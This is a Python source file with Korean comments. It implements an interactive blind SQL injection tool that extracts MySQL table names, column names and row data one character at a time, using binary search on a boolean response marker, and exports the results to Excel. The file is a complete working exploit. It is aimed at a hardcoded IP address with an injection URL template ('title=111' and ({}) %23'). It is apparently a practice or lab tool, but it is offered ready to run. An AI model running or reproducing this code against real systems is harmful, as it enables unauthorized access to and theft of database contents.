import requests
import pandas as pd
import os

class Module:
    def __init__(self, url):
        self.url = url          # 웹 리소스 접근 URL 설정
        self.tableWordDic = {}  # 테이블 단어 정보를 저장할 딕셔너리 초기화
        self.columnWordDic = {} # 컬럼 단어 정보를 저장할 딕셔너리 초기화 
        self.dataWordDic = {}   # 데이터 단어 정보를 저장할 딕셔너리 초기화

        # 개수 구하기 쿼리 모음
        self.countQuery = {
            "TABLE": "SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')",
            "COLUMN": "SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name = '{}' AND table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')",
            "DATA": "SELECT COUNT({}) FROM {}"
        }
        
        # 길이 구하기 쿼리 모음
        self.lenQuery = {
            "TABLE": "SELECT LENGTH(table_name) FROM (SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys') LIMIT {}, 1) AS t",
            "COLUMN": "SELECT LENGTH(column_name) FROM (SELECT column_name FROM information_schema.columns WHERE table_name = '{}' AND table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys') LIMIT {}, 1) AS t",
            "DATA": "SELECT LENGTH({}) FROM (SELECT {} FROM {} LIMIT {}, 1) AS t"
        }
        
        # 단어 구하기 쿼리 모음
        self.wordQuery = {
            "TABLE": "SELECT ORD(SUBSTR(table_name, {}, 1)) FROM (SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys') LIMIT {}, 1) AS t",
            "COLUMN": "SELECT ORD(SUBSTR(column_name, {}, 1)) FROM (SELECT column_name FROM information_schema.columns WHERE table_name = '{}' AND table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys') LIMIT {}, 1) AS t",
            "DATA": "SELECT ORD(SUBSTR({}, {}, 1)) FROM (SELECT {} FROM {} LIMIT {}, 1) AS t"
        }
    
    # MAX값 탐지 함수    
    def exponentialSearch(self, query):
        baseQuery = "(" + query + ") > {}"
        min_val, max_val = 1, 1
        attackUrl = self.url.format(baseQuery.format(max_val))
        response = requests.get(attackUrl)

        # 단계 1: max 값을 찾기
        while "111" in response.text:
            min_val = max_val
            max_val *= 2
            attackUrl = self.url.format(baseQuery.format(max_val))
            response = requests.get(attackUrl)

        # 단계 2: 이진 검색 수행
        return self.binarySearch(query, min_val, max_val)

    # 이진 탐색 함수
    def binarySearch(self, query, min_val, max_val):
        baseQuery = "(" + query + ") > {}"
        while min_val < max_val:
            avg = int((min_val + max_val) / 2)
            attackQuery = baseQuery.format(avg)        
            attackUrl = self.url.format(attackQuery)
            response = requests.get(attackUrl)
            if "111" in response.text:            
                min_val = avg + 1                    
            else:
                max_val = avg
        return min_val
    
    # 테이블 개수 탐색 함수
    def countForTable(self, type):
        query = self.countQuery[type]
        count = self.exponentialSearch(query)
        print("{}의 개수는 {}개 입니다.".format(type, count))
        return count
    
    # 컬럼 개수 탐색 함수
    def countForColumn(self, type, tableName):
        query = self.countQuery[type].format(tableName)
        count = self.exponentialSearch(query)
        print("{}의 개수는 {}개 입니다.".format(type, count))
        return count
    
    # 데이터 개수 탐색 함수
    def countForData(self, type, columnName, tableName):
        query = self.countQuery[type].format(columnName, tableName)
        count = self.exponentialSearch(query)
        print("{}의 개수는 {}개 입니다.".format(type, count))
        return count
    
    # 테이블 조회 함수
    def tableSearch(self, type, count, start):
        word = ""
        if start != 1:
            startNum = start
        else:
            startNum = 1
        for i in range(startNum, count + 1):
            query = self.lenQuery[type].format(i-1)
            length = self.exponentialSearch(query)
            for j in range(1, length + 1):
                query = self.wordQuery[type].format(j, i-1)
                word = self.wordSearch(query, word)
            print(i, ":", word)
            self.tableWordDic[str(i)] = word
            word = ""

    # 컬럼 조회 함수
    def columnSearch(self, tableName, type, count, start):
        word = ""
        if start != 1:
            startNum = start
        else:
            startNum = 1
        for i in range(startNum, count + 1):
            query = self.lenQuery[type].format(tableName, i-1)
            length = self.exponentialSearch(query)
            for j in range(1, length + 1):
                query = self.wordQuery[type].format(j, tableName, i-1)
                word = self.wordSearch(query, word)
            print(i, ":", word)
            self.columnWordDic[str(i)] = word
            word = ""

    # 데이터 조회 함수
    def dataSearch(self, columnName, tableName, type, count, start):
        word = ""
        if start != 1:
            startNum = start
        else:
            startNum = 1
        for i in range(startNum, count + 1):
            query = self.lenQuery[type].format(columnName, columnName, tableName, i-1)
            length = self.exponentialSearch(query)
            for j in range(1, length + 1):
                query = self.wordQuery[type].format(columnName, j, columnName, tableName, i-1)
                word = self.wordSearch(query, word)
            print(i, ":", word)
            self.dataWordDic[str(i)] = word
            word = ""
    
    # 단어 추출 함수
    def wordSearch(self, query, word):
        asciiCharacter = self.exponentialSearch(query)
        if asciiCharacter > 127:
            utf8_encoded = asciiCharacter.to_bytes((asciiCharacter.bit_length() + 7) // 8, 'big').decode('utf-8', errors='ignore')
            word += utf8_encoded
        else:
            character = chr(asciiCharacter)
            word += character
        return word
    
    # Dic 출력 함수
    def printWordDic(self, type):
        if type == 'TABLE':
            for key, value in self.tableWordDic.items():
                print(key + ":" + value)
        elif type == 'COLUMN':
            for key, value in self.columnWordDic.items():
                print(key + ":" + value)
        elif type == 'DATA':
            for key, value in self.dataWordDic.items():
                print(key + ":" + value)

    # Ascii Art
    def asciiArt(self):
        print(r"""
                 ____  _     ___ _   _ ____    ____   ___  _     
                | __ )| |   |_ _| \ | |  _ \  / ___| / _ \| |    
                |  _ \| |    | ||  \| | | | | \___ \| | | | |    
                | |_) | |___ | || |\  | |_| |  ___) | |_| | |___ 
                |____/|_____|___|_|_\_|____/__|____/_\__\_\_____|
                |_ _| \ | |   | | ____/ ___|_   _|_ _/ _ \| \ | |
                 | ||  \| |_  | |  _|| |     | |  | | | | |  \| |
                 | || |\  | |_| | |__| |___  | |  | | |_| | |\  |
                |___|_| \_|\___/|_____\____| |_| |___\___/|_| \_|
              
            """)

    # 메뉴 출력 함수
    def menu(self):
        print("""
                  *****************MENU****************
                  --------------------------------------
                  1. 테이블 출력   4. 저장된 테이블 출력   
                  2. 컬럼   출력   5. 저장된 컬럼   출력    
                  3. 데이터 출력   6. 저장된 데이터 출력
                  --------------------------------------
                  """)    
        
    # 엑셀 파일로 저장 함수
    def save_to_excel(self,columnName):     # **
        try:
            data_file = 'data.xlsx'
            table_file = 'tables.xlsx'
            column_file = 'columns.xlsx'
            
            # 테이블 정보 저장
            if self.tableWordDic:
                table_df = pd.DataFrame(list(self.tableWordDic.items()), columns=['Index', 'Table Name'])
                if os.path.exists(table_file):
                    existing_df = pd.read_excel(table_file)
                    combined_df = pd.concat([existing_df, table_df], axis=1)
                    combined_df.to_excel(table_file, index=False)
                else:
                    table_df.to_excel(table_file, index=False)
                print("테이블 정보를 tables.xlsx 파일로 저장했습니다.")
            
            # 컬럼 정보 저장
            if self.columnWordDic:
                column_df = pd.DataFrame(list(self.columnWordDic.items()), columns=['Index', 'Column Name'])
                if os.path.exists(column_file):
                    existing_df = pd.read_excel(column_file)
                    combined_df = pd.concat([existing_df, column_df], axis=1)
                    combined_df.to_excel(column_file, index=False)
                else:
                    column_df.to_excel(column_file, index=False)
                print("컬럼 정보를 columns.xlsx 파일로 저장했습니다.")
            
            # 데이터 정보 저장
            if self.dataWordDic:
                data_df = pd.DataFrame(list(self.dataWordDic.items()), columns=['Index', columnName])       # **
                if os.path.exists(data_file):
                    existing_df = pd.read_excel(data_file)
                    combined_df = pd.concat([existing_df, data_df], axis=1)
                    combined_df.to_excel(data_file, index=False)
                else:
                    data_df.to_excel(data_file, index=False)
                print("데이터 정보를 data.xlsx 파일로 저장했습니다.")
        except Exception as e:
            print(f"엑셀 파일 저장 중 오류 발생: {e}")




    # 실행 함수
    def run(self):
        self.asciiArt()
        while True:
            # 예외 처리
            try:
                self.menu()
                num = int(input("진행할 기능 선택: "))
                # 테이블 출력
                if num == 1:
                    count = self.countForTable("TABLE")
                    start = int(input("몇 번째 항목부터 출력할까요?(처음 = 1):"))
                    self.tableSearch("TABLE", count, start)
                # 컬럼 출력
                elif num == 2:
                    table = input("어떤 테이블의 컬럼을 출력할까요?: ")
                    count = self.countForColumn("COLUMN", table)
                    start = int(input("몇 번째 항목부터 출력할까요?(처음 = 1):"))
                    self.columnSearch(table, "COLUMN", count, start)
                # 데이터 출력
                elif num == 3:
                    tableName, columnName = input("어떤 테이블의 어떤 컬럼을 출력할까요?(두 개의 값을 공백으로 나누세요): ").split()
                    count = self.countForData("DATA", columnName, tableName)
                    start = int(input("몇 번째 항목부터 출력할까요?(처음 = 1):"))
                    self.dataSearch(columnName, tableName, "DATA", count, start)

                    excel=int(input("엑셀 파일에 저장하시겠습니까? (Yes:1 No:2) >>"))
                    if excel==1:
                        self.save_to_excel(columnName)
                    elif excel==2:
                        print("엑셀에 저장하지 않음")
                    
                # 저장된 테이블 출력
                elif num == 4:
                    self.printWordDic('TABLE')
                # 저장된 컬럼 출력
                elif num == 5:
                    self.printWordDic('COLUMN')
                # 저장된 데이터 출력
                elif num == 6:
                    self.printWordDic('DATA')
            except Exception as e:
                print(f"예외 발생: {e}")

if __name__ == '__main__':
    # 테스트할 웹 URL 주소 및 공격 형태
    url = "http://43.202.240.147:8080/api/posts?title=111' and ({}) %23"
    module = Module(url)
    module.run()
